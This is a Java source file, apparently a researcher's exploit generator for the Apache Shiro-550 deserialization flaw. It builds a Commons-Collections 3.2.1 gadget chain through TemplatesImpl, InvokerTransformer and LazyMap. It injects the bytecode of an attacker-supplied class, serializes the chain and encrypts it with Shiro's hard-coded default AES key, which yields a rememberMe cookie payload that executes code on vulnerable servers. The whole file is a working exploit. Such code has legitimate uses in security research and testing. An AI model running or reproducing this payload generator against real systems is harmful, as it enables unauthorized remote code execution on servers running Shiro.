import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.crypto.*;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.lang.reflect.Field;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.crypto.JcaCipherService;
import org.apache.shiro.util.ByteSource;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/4/11
 * Description shiro550使用CC链 commons-collections3.2.1,JDK无版本限制
 */
public class shiro550Test1 {
    final static String path = "ser.bin";
    private static final String KEY = "kPH+bIxk5D2deZiIxcaaaA==";

    public static void main(String[] args) throws Exception{
        // 注意:由于tomcat无法解析对象数组，所以导致ChainTransformer无法使用，改一下路子即可
        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"zzz");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[][] b = {classBytes()};
        bytecodes.set(templates,b);

        InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", null, null);

        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map,new ConstantTransformer("q"));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"222");
        lazyMap.remove(templates);

        Class aClass = LazyMap.class;
        Field factory = aClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,newTransformer);
        serialize(hashMap);
//        deserialize();

        String enc = enc(getFile());
        System.out.print(enc);

    }

    // AES_CBC加密 使用的shiro原生的加密
    public static String enc(byte[] data){
        CipherService cipherService = new AesCipherService();
        byte[] key = Base64.decode(KEY);
        ByteSource encrypt = cipherService.encrypt(data, key);
        byte[] bytes = encrypt.getBytes();
        String s = Base64.encodeToString(bytes);
        return s;
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }

    // 一个静态代码块中带有可执行代码的class
    public static byte[] classBytes() throws IOException {
        // 注意路径
        FileInputStream fis = new FileInputStream("C:\\Users\\53433\\Desktop\\class\\Cattle.class");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }

    // 获取 ser.bin 也就是生成的序列化字符串的东西
    public static byte[] getFile() throws Exception{
        FileInputStream fis = new FileInputStream("ser.bin");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }
}
